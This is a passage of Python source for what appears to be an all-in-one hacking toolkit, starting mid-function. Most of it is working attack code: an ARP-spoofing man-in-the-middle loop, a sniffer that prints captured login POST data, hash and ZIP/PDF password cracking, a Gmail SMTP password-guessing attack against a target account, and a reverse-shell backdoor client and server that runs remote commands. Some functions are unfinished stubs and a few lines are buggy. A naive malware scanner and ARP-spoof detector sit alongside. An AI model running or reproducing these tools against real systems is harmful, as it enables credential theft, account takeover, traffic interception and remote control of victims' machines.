        if sockObject.connect_ex((targetIP, port)):
            print("[" + lightred + f"Port {port}" + reset + "] is" + lightred + " CLOSE" + reset)
            time.sleep(1)
        else:
            print("[" + lightgreen + f"Port {port}" + reset + "] is" + lightgreen + " OPEN" + reset)
            time.sleep(1)

    try:
        targetIpv4Address = socket.gethostbyname(targetHost)
    except:
        print("[" + lightred + "Unknown IP" + reset + "]")
    try:
        targetIpv4AddressName = gethostbyaddr(targetIpv4Address)
        print("[" + lightgreen + "+" + reset + "] Started scanning [" + lightgreen + targetIpv4AddressName + reset + "] :-")
    except:
        print("[" + lightgreen + "+" + reset + "] Started scanning [" + lightgreen + targetIpv4Address + reset + "] :-")

    socket.setdefaulttimeout(1.5)

    for singleTargetPort in targetPorts:
        threadObject = Thread(target=scanConnection, args=(targetHost, int(singleTargetPort)))
        threadObject.start()
        time.sleep(1)
"""

def ssh_bruteforce(host, username):
    print()
"""
def detect_net_attack(interface):
    scapy.sniff(iface=interface, store=False, prn=detect_netattack_back)
"""
def network_ids(interface):
    scapy.sniff(iface=interface, store=False, prn=detect_netattack_back)

def detect_netattack_back(networkPacket):
    if networkPacket.haslayer(scapy.ARP) and networkPacket[scapy.ARP].op == 2:
        try:
            realMAC_ADDRESS = get_TargetMAC_Address(networkPacket[scapy.ARP].psrc)
            MACinResponse   = networkPacket[scapy.ARP].hwsrc

            if realMAC_ADDRESS != MACinResponse:
                print("[" + lightred + "ALERT" + reset + "] - " + lightred + "MITM attack detected" + reset)
        except IndexError:
            pass

def arp_spoof_back(targetIP, spoofIP):
    targetMAC = get_TargetMAC_Address(targetIP)
    ARP_PACKET = scapy.ARP(op=(2), pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    scapy.send(ARP_PACKET, verbose=False)

def arp_spoof_back_reverse(destIP, srcIP):
    destMAC_Address = get_TargetMAC_Address(destIP)
    sourceIPv4_MAC = get_targetMAC_Address(srcIP)
    ARP_PACKET = scapy.ARP(op=(2), pdst=destIP, hwdst=destMAC_Address, psrc=srcIP, hwsrc=sourceIPv4_MAC)

def arp_spoof(routerIP, targetIP):
    numberOfPacketsSent = 0
    time.sleep(2)
    print("\n[" + lightgreen + "ARP Spoof Started" + reset + "]\n")
    try:
        while True:
            arp_spoof_back(targetIP, routerIP)
            arp_spoof_back(routerIP, targetIP)
            numberOfPacketsSent = numberOfPacketsSent + 2
            typeCasedNumOfPackets = str(numberOfPacketsSent)
            print("[" + lightgreen + "*" + reset + f"] Sent {typeCasedNumOfPackets} ARP packets")
            time.sleep(2)
    except PermissionError:
        print("\n[" + red + "You must run this as root" + reset + "]")

def urlProtocolNameExtractor(portNum):
    if portNum == 80:
        return "http"
    elif portNum == 21:
        return "ftp"
    elif portNum == 22:
        return "ssh"
    elif portNum == 25:
        return "smtp"

def sniff_packets(interface):
    print("\n[" + lightred + "-" + reset + "] " + lightred + "This packet sniffer is not yet fully built." + reset)
    #protocolPortNumbers = str(protocols_portNumbers(protocol))
    scapy.sniff(iface=interface, store=False, prn=processedNetworkPackets, filter="port 80")

def processedNetworkPackets(packetToProcess):
    try:
        if packetToProcess.haslayer(http.HTTPRequest): # or packetToProcess.haslayer(scapy.Raw):
            #if packetToProcess.haslayer(scapy.Raw): # or packetToProcess.haslayer(HTTPRequest):
            packetsWithHTTP_Layer = packetToProcess[http.HTTPRequest].Referer
            urlProtocolPort = packetToProcess[scapy.TCP].dport
            urlProtocolName = urlProtocolNameExtractor(urlProtocolPort)
            url = urlProtocolName + "://" + packetToProcess[http.HTTPRequest].Host.decode() + packetToProcess[http.HTTPRequest].Path.decode()
            ipAddress = packetToProcess[scapy.IP].src
            requestMethod = packetToProcess[http.HTTPRequest].Method.decode()
            print("[" + lightgreen + ipAddress + reset + "][" + lightgreen + requestMethod + reset + "] -----> " + lightgreen + url + reset)
            """
            if "http://" in packetsWithHTTP_Layer.decode('UTF-8'):
                print(packetToProcess[http.HTTPRequest].Referer)
            """
            if packetToProcess.haslayer(scapy.Raw) and requestMethod == "POST":
                loadRawString = packetToProcess[scapy.Raw].load
                possibleLoginKeywords = ["username", "user", "usr", "uname", "email", "emailaddr", "password", "pass", "passwd", "login", "loginpassword", "loginpass", "name", "handel", "id", "urd_id", "usrid"]
                for singlePossibleLoginKeyword in possibleLoginKeywords:
                    if singlePossibleLoginKeyword in loadRawString.decode():
                        print(loadRawString)
                        break
    except IndexError:
        pass

def dos():
    print()
    # Under construction

def fake_access_point(interface, fap_name):
    randomMacAddress = ["8a:2d:19:47:9a:23", "70:0c:f6:c7:c7:4d", "c0:9b:6b:01:27:d6", "32:0c:c1:fb:ba:b7", "8e:b9:92:48:16:c5", "58:7b:de:68:8c:e6", "be:e9:1c:cd:a6:bd", "28:c1:a1:aa:84:cb", "b2:65:df:d1:41:10", "86:ff:2e:9e:69:55", "e6:77:8a:1b:64:28", "40:d8:e7:d1:7a:63", "ca:f0:6a:4e:bd:32", "f4:ba:62:0b:19:35", "90:15:6e:64:85:ee", "d1:a6:55:3c:8a:c1", "28:2d:19:f6::c7:4d"]
    fakeAccessPointName = fap_name
    # Under construction

def change_mac_address(interface, new_mac, ischeck):
    if new_mac == "rand":
        randomMacAddress = ["8a:2d:19:47:9a:23", "70:0c:f6:c7:c7:4d", "c0:9b:6b:01:27:d6", "32:0c:c1:fb:ba:b7", "8e:b9:92:48:16:c5", "58:7b:de:68:8c:e6", "be:e9:1c:cd:a6:bd", "28:c1:a1:aa:84:cb", "b2:65:df:d1:41:10", "86:ff:2e:9e:69:55", "e6:77:8a:1b:64:28", "40:d8:e7:d1:7a:63", "ca:f0:6a:4e:bd:32", "f4:ba:62:0b:19:35", "90:15:6e:64:85:ee", "d1:a6:55:3c:8a:c1", "28:2d:19:f6::c7:4d"]
        while True:
            randomMAC = random.choice(randomMacAddress)
            ifconfigRandomMacRegex = subprocess.check_output(["sudo", "ifconfig", interface])
            regExCheckRandomMAC = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfigRandomMacRegex.decode('UTF-8'))
            if regExCheckRandomMAC.group(0) == randomMAC:
                time.sleep(1.5)
                print("\n[" + lightred + "*" + reset + "] " + lightred + "The new MAC address cant be the same as the old one" + reset)
                sys.exit()
                #continue
            else:
                time.sleep(1.5)
                print("\n[" + lightgreen + "*" + reset + "] " + lightgreen + "Process started" + reset)
                time.sleep(1.5)
                print("[" + lightgreen + "*" + reset + "] " + lightgreen + "Taking down the interface" + reset)
                time.sleep(1.5)
                subprocess.call(["sudo", "ifconfig", interface, "down"])
                print("[" + lightgreen + "*" + reset + "] " + lightgreen + f"Changing the MAC address to {randomMAC}" + reset)
                time.sleep(1.5)
                subprocess.call(["sudo", "ifconfig", "wlan0", "hw", "ether", randomMAC])
                subprocess.call(["sudo", "ifconfig", interface, "up"])
                postProcessRandomMAC = subprocess.check_output(["sudo", "ifconfig", interface])
                postProcessRandomMAC_RegExValidation = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", postProcessRandomMAC.decode('UTF-8'))
                if postProcessRandomMAC_RegExValidation.group(0) == randomMAC and postProcessRandomMAC_RegExValidation.group(0) != regExCheckRandomMAC:
                    print("[" + lightgreen + "*" + reset + "] " + lightgreen + "Process finished" + reset)
                    time.sleep(1.5)
                    if ischeck=="TRUE" or ischeck=="true":
                        print("\n[" + lightgreen + "Checking if the MAC address has changed" + reset + "].....\n")
                        time.sleep(1.5)
                        subprocess.call(["sudo", "ifconfig", interface])
                        return randomMAC
                        break
                else:
                    print("\n[" + lightred + "*" + reset + "] " + lightred + "We ran into an unexpected error. Please try checking if the format of the MAC address is correct or try again :(" + reset)
    elif new_mac != "rand":
        macAddress = new_mac
        newMAC = new_mac
        returnDict = {"MAC":macAddress}
        ifconfigResultsREGEX = subprocess.check_output(["sudo", "ifconfig", interface])
        regExCheckMAC_PRE_CHANGE = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfigResultsREGEX.decode('UTF-8'))
        if regExCheckMAC_PRE_CHANGE.group(0) == macAddress:
            time.sleep(1.5)
            print("\n[" + lightred + "*" + reset + "] " + lightred + "The new MAC address cant be the same as the old one" + reset)
            sys.exit()
        else:
            print("\n[" + lightgreen + "*" + reset + "] " + lightgreen + "Process started" + reset)
            time.sleep(1.5)
            print("[" + lightgreen + "*" + reset + "] " + lightgreen + "Taking down the interface" + reset)
            time.sleep(1.5)
            subprocess.call(["sudo", "ifconfig", interface, "down"])
            print("[" + lightgreen + "*" + reset + "] " + lightgreen + f"Changing the MAC address to {newMAC}" + reset)
            time.sleep(1.5)
            subprocess.call(["sudo", "ifconfig", "wlan0", "hw", "ether", macAddress])
            subprocess.call(["sudo", "ifconfig", interface, "up"])
            postProcessMAC = subprocess.check_output(["sudo", "ifconfig", interface])
            postProcessMAC_Validation = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", postProcessMAC.decode('UTF-8'))
            #print(postProcessMAC_Validation.group(0))
            if postProcessMAC_Validation.group(0) == macAddress and postProcessMAC_Validation.group(0) != regExCheckMAC_PRE_CHANGE.group(0):
                print("[" + lightgreen + "*" + reset + "] " + lightgreen + "Process finished" + reset)
                time.sleep(1.5)
                if ischeck=="TRUE" or ischeck=="true":
                    print("\n[" + lightgreen + "Checking if the MAC address has changed" + reset + "].....\n")
                    time.sleep(1.5)
                    subprocess.call(["sudo", "ifconfig", interface])
                    return returnDict
                elif ischeck=="FALSE" or ischeck=="false":
                    return returnDict
            else:
                print("\n[" + lightred + "*" + reset + "] " + lightred + "We ran into an unexpected error. Please try checking if the format of the MAC address is correct or try again :(" + reset)

def replace_download_files():
    print()
    # under construction

def hash_crack(hash_type, passwordHash, wordlist):
    passwordsTried = 0
    if wordlist != "default":
        if hash_type == "sha1":
            with open(wordlist) as passwordsWordlist:
                for singlePasswordKeyword in passwordsWordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip()
                    hashedStrippedSinglePasswordKeyword = hashlib.sha1(bytes(strippedSinglePasswordKeyword, 'utf-8')).hexdigest()
                    if hashedStrippedSinglePasswordKeyword == passwordHash:
                        print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                        print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                        #print(passwordsTried)
                        quit()
                    else:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
        elif hash_type == "sha224":
            with open(wordlist) as passwordsWordlist:
                for singlePasswordKeyword in passwordsWordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip()
                    hashedStrippedSinglePasswordKeyword = hashlib.sha224(bytes(strippedSinglePasswordKeyword, 'utf-8')).hexdigest()
                    if hashedStrippedSinglePasswordKeyword == passwordHash:
                        print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                        print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                        #print(passwordsTried)
                        quit()
                    else:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
        elif hash_type == "sha256":
            with open(wordlist) as passwordsWordlist:
                for singlePasswordKeyword in passwordsWordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip()
                    hashedStrippedSinglePasswordKeyword = hashlib.sha256(bytes(strippedSinglePasswordKeyword, 'utf-8')).hexdigest()
                    if hashedStrippedSinglePasswordKeyword == passwordHash:
                        print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                        print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                        #print(passwordsTried)
                        quit()
                    else:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
        elif hash_type == "sha512":
            with open(wordlist) as passwordsWordlist:
                for singlePasswordKeyword in passwordsWordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip()
                    hashedStrippedSinglePasswordKeyword = hashlib.sha512(bytes(strippedSinglePasswordKeyword, 'utf-8')).hexdigest()
                    if hashedStrippedSinglePasswordKeyword == passwordHash:
                        print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                        print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                        #print(passwordsTried)
                        quit()
                    else:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
        elif hash_type == "md5":
            with open(wordlist) as passwordsWordlist:
                for singlePasswordKeyword in passwordsWordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip()
                    hashedStrippedSinglePasswordKeyword = hashlib.md5(bytes(strippedSinglePasswordKeyword, 'utf-8')).hexdigest()
                    if hashedStrippedSinglePasswordKeyword == passwordHash:
                        print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                        print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                        #print(passwordsTried)
                        quit()
                    else:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
    elif wordlist == "default":
        if hash_type == "sha1":
            wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
            for singlePasswordKeyword in wordlist.split('\n'):
                hashIntoSHA_1 = hashlib.sha1(bytes(singlePasswordKeyword, 'utf-8')).hexdigest()
                if hashIntoSHA_1 == passwordHash:
                    print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                    print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    #print(passwordsTried)
                    quit()
                else:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    passwordsTried = passwordsTried + 1
                    time.sleep(0.0000001)
        elif hash_type == "sha224":
            wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
            for singlePasswordKeyword in wordlist.split('\n'):
                hashIntoSHA_1 = hashlib.sha224(bytes(singlePasswordKeyword, 'utf-8')).hexdigest()
                if hashIntoSHA_1 == passwordHash:
                    print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                    print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    #print(passwordsTried)
                    quit()
                else:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    passwordsTried = passwordsTried + 1
                    time.sleep(0.0000001)
        elif hash_type == "sha256":
            wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
            for singlePasswordKeyword in wordlist.split('\n'):
                hashIntoSHA_1 = hashlib.sha256(bytes(singlePasswordKeyword, 'utf-8')).hexdigest()
                if hashIntoSHA_1 == passwordHash:
                    print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                    print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    #print(passwordsTried)
                    quit()
                else:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    passwordsTried = passwordsTried + 1
                    time.sleep(0.0000001)
        elif hash_type == "sha512":
            wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
            for singlePasswordKeyword in wordlist.split('\n'):
                hashIntoSHA_1 = hashlib.sha512(bytes(singlePasswordKeyword, 'utf-8')).hexdigest()
                if hashIntoSHA_1 == passwordHash:
                    print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                    print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    #print(passwordsTried)
                    quit()
                else:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    passwordsTried = passwordsTried + 1
                    time.sleep(0.0000001)
        elif hash_type == "md5":
            wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
            for singlePasswordKeyword in wordlist.split('\n'):
                hashIntoSHA_1 = hashlib.md5(bytes(singlePasswordKeyword, 'utf-8')).hexdigest()
                if hashIntoSHA_1 == passwordHash:
                    print("\n[" + lightgreen + "*" + reset + "] Tried " + lightgreen + str(passwordsTried) + reset + " passwords")
                    print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    #print(passwordsTried)
                    quit()
                else:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    passwordsTried = passwordsTried + 1
                    time.sleep(0.0000001)

def gmail_dictatk(target_gmail, wordlist):
    SMTP_SERVER = smtplib.SMTP("smtp.gmail.com", 587)
    SMTP_SERVER.ehlo()
    SMTP_SERVER.starttls()
    if wordlist == "default":
            wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
            for singlePasswordKeyword in wordlist.split('\n'):
                strippedSinglePasswordKeyword = singlePasswordKeyword.strip('\n')
                try:
                    SMTP_SERVER.login(target_gmail, strippedSinglePasswordKeyword)
                    print("\n[" + lightgreen + "Password Found" + reset + "] - [" + lightgreen + "Gmail" + reset + f"] = {target_gmail}, [" + lightgreen + "Password" + reset + f"] = {singlePasswordKeyword}")
                    break
                except smtplib.SMTPAuthenticationError:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    time.sleep(0.01)
    else:
        with open(wordlist) as passwordWordlist:
            for singlePasswordKeyword in passwordWordlist.split('\n'):
                strippedSinglePasswordKeyword = singlePasswordKeyword.strip('\n')
                try:
                    SMTP_SERVER.login(target_gmail, strippedSinglePasswordKeyword)
                    print("\n[" + lightgreen + "Password Found" + reset + "] - [" + lightgreen + "Gmail" + reset + f"] = {target_gmail}, [" + lightgreen + "Password" + reset + f"] = {singlePasswordKeyword}")
                    break
                except smtplib.SMTPAuthenticationError:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    time.sleep(0.01)
    print("\n[" + lightred + "-" + reset + "] " + lightred + "Password not found in the wordlist" + reset)

def crack_passprotected(filetype, file_path, wordlist):
    if wordlist == "default":
        if filetype == "zip":
            zipFileObject = zipfile.ZipFile(file_path)
            wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
            for singlePasswordKeyword in wordlist.split('\n'):
                strippedSinglePasswordKeyword = singlePasswordKeyword.strip('\n').strip("\r")
                try:
                    zipFileObject.extractall(pwd=strippedSinglePasswordKeyword)
                    print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                except:
                    print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                    #passwordsTried = passwordsTried + 1
                    time.sleep(0.0000001)
                    continue
        elif filetype == "pdf":
                wordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt").read(), 'utf-8')
                for singlePasswordKeyword in wordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip('\n').strip('\r')
                    try:
                        with pikepdf.open(file_path, strippedSinglePasswordKeyword) as pdf:
                            print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    except:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        #passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
                        continue
    elif wordlist != "default":
        if filetype == "zip":
            zipFileObject = zipfile.ZipFile(file_path)
            with open(wordlist) as wordlist:
                for singlePasswordKeyword in wordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip('\n').strip("\r")
                    try:
                        zipFileObject.extractall(pwd=strippedSinglePasswordKeyword)
                        print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    except:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        #passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
                        continue
        elif filetype == "pdf":
            with open(wordlist) as wordlist:
                for singlePasswordKeyword in wordlist.split('\n'):
                    strippedSinglePasswordKeyword = singlePasswordKeyword.strip('\n').strip('\r')
                    try:
                        with pikepdf.open(file_path, strippedSinglePasswordKeyword) as pdf:
                            print("\n[" + lightgreen + "Password Cracked" + reset + "] [" + lightred + "password" + reset + "] = " + str(singlePasswordKeyword))
                    except:
                        print("[" + lightred + "*" + reset + "] Tried password [" + lightred + str(singlePasswordKeyword) + reset + "] -----> " + lightred + "No match found :(" + reset)
                        #passwordsTried = passwordsTried + 1
                        time.sleep(0.0000001)
                        continue

def wifi_atk():
    socketObject = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    packet = socketObject.recvfrom(2084)[0]
    print(packet.hex())
    if packet[0:2] == b'\x00\x00':
        radioTapPacketHeaderLength = int(packet[2])
        packet = packet[radioTapPacketHeaderLength]
        if packet != b'\x00\x00\x00\x00':
            networkFrameCTL = packet[0:2]
            duration = packet[2:4]
            address_1 = packet[4:10]
            address_2 = packet[10:16]
            address_3 = packet[16:22]
            sequenceController = packet[22:24]
            address_4 = packet[24:30]
            payload = packet[30:-4]
            crc = packet[-4:]
            BEACON_FRAME = b'\x80\x00'
            ASSOCIATION_RESP_FRAME = b'\x10\x00'
            HANDSHAKE_AP_FRAME = b'\x88\x02'
            HANDSHAKE_STA_FRAME = b'\x88\x01'

def keylogger():
    print()

def sys_command_exe(sys_command):
    return subprocess.check_output(sys_command, shell=True)

def backdoor_client(server_ip, server_port):
    socketConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socketConnection.connect((server_ip, server_port))
    #connection_establishment_alert = "\n[" + lightgreen + "*" + reset + "] Connection established\n"
    #socketConnection.sendto(connection_establishment_alert.encode(), (server_ip, server_port))
    try:
        while True:
            recived_data = socketConnection.recv(1024)
            print(recived_data)
            """
            stripped_recived_data = reviced_data.strip("b'")
            final_stripped_recived_data = stripped_recived_data.strip("'")
            if final_stripped_recived_data == "start_keylogger":
                print()
            elif final_stripped_data = "proxy_vuln_scan":
            """
            command_results = sys_command_exe(recived_data)
            socketConnection.sendto(command_results, (server_ip, server_port))
    except subprocess.CalledProcessError:
        wrong_command_error_alert = "\n[" + lightred + "Invalid command" + reset + "]"
        socketConnection.sendto(wrong_command_error_alert.encode(), (server_ip, server_port))
    socketConnection.close()

def backdoor_server(server_ip, server_port):
    server_listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_listner.bind((server_ip, server_port))
    server_listner.listen(0)
    print("\n[" + lightgreen + "*" + reset + "] Waiting for the victim to connect\n")
    established_connection, address = server_listner.accept()
    print("\n[" + lightgreen + "*" + reset + "] Got a reverse_tcp connection from [" + lightgreen + str(address[0]) + reset + "] on port " + lightgreen + str(address[1]))
    try:
        while True:
            command = input("\n[" + lightgreen + "command" + reset + "]> ")
            established_connection.send(command.encode())
            command_output = established_connection.recv(1024)
            print(command_output)
    except BrokenPipeError:
        print("\n[" + lightred + "-" + reset + "] Connection lost :(")
    except OSError:
        print("\n[" + lightred + "-" + reset + "] Try again after a few seconds")
    except KeyboardInterrupt:
        print("\n[" + lightred + "Exiting the server" + reset + "]")

def endpoint_ids():
    print("\n[" + lightgreen + "*" + reset + "] Checking for malware signatures.....")
    time.sleep(1)
    suspected_programs = glob.glob("*.py") + glob.glob("*.php") + glob.glob("*.c") + glob.glob("*.cpp")
    for single_suspected_program in suspected_programs:
        fileInfectionStatus = False
        openedSuspectedProgram = open(single_suspected_program, "r")
        linesInSuspectedProgram = openedSuspectedProgram.readlines()
        openedSuspectedProgram.close()
        for singleLine in linesInSuspectedProgram:
            if (re.search("socket.socket(socket.AF_INET, socket.SOCK_STREAM)", singleLine)) or (re.search("socket.SOL_SOCKET, socket.SO_REUSEADDR", singleLine)) or (re.search("socket.socket()", singleLine)) or (re.search(".recv(1024)", singleLine)) or (re.search("import socket", singleLine)) or (re.search("AF_INET", singleLine)) or (re.search("SOCK_STREAM", singleLine)) or (re.search("SOL_SOCKET", singleLine)) or (re.search("SOL_REUSEADDR", singleLine)) or (re.search("$_COOKIE['shell']", singleLine)) or (re.search("new Socket", singleLine)) or (re.search("backdoor", singleLine)) or (re.search("simplyhack.backdoor", singleLine)) or (re.search("buffer", singleLine)):
                print("\n[" + lightred + "ALERT!" + reset + "] [" + lightred + single_suspected_program + reset + "] is suspected as a " + lightred + "malware" + reset)
                time.sleep(1.5)
                fileInfectionStatus = True
                break
        if (fileInfectionStatus != True):
            print("\n[" + lightgreen + "*" + reset + "] [" + lightgreen + single_suspected_program + reset + "] seems like a " + lightgreen + "safe file" + reset)
            time.sleep(1.5)
